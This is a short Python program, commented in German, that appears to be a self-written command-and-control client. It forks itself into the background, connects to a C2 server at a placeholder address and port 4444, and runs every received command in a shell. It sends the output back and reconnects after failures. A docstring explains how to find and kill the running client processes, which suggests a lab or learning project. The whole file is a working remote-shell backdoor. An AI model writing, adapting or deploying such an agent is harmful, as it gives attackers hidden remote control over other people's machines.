import socket
import subprocess
import os
import sys
import time

"""
Um die Client-Prozesse zu stoppen:

1. Prozesse finden
- pgrep -f client.py

2. Prozesse beenden (dafür die Prozess Ids der oben ausgelesenen Prozesse verwenden)
- kill PID PID1 ...
- kill -9 PID PID1 ... (falls der normale kill Befehl nicht funktioniert)
"""




def deamonize():
    """Client im Hintergrund ausführen, indem der Prozess geforkt wird"""
    try:
        pid = os.fork()
        if pid > 0:
            # Parent Process existiert
            sys.exit(0)
    except OSError as e:
        print(f"[!] Fork failed: {e}")
        sys.exit(1)

    # Child Proess
    os.setsid()  # Session erstellen
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        print(f"[!] Second fork failed: {e}")
        sys.exit(1)

    print("[*] Client läuft im Hintergrund")


def connect_to_server():
    """Mit dem C2 Server verbinden und Befehle verarbeiten"""
    print("[*] Versuche Verbindung zum C2 Server herzustellen...")
    retries: int = 5
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(("127.0.0.1", 4444))  # Server IP einfügen
            print(f"[*] Mit C2 Server verbunden")
            while True:
                # Befehle vom Server erhalten
                command = client.recv(4096).decode("utf-8", errors="ignore")
                if not command:
                    break
                try:
                    # Befehl ausführen und output speichern
                    result = subprocess.run(
                        command, shell=True, capture_output=True, text=True
                    )
                    output = result.stdout + result.stderr
                except Exception as e:
                    output = f"Error: {str(e)}"
                # Output an C2 Server senden
                client.send(output.encode("utf-8"))
        except Exception as e:
            print(f"[!] Connection Fehler: {e}")
            time.sleep(5)  # Nach 5 Sekunden erneut versuchen
            if retries > 0:
                retries -= 1
            else:
                sys.exit(0)



        finally:
            print("[*] Verbindung zum C2 Server verloren ...")
            if client:
                client.close()


if __name__ == "__main__":
    print("[*] Starte Client...")
    deamonize()  # Im Hintergrund ausführen
    connect_to_server()
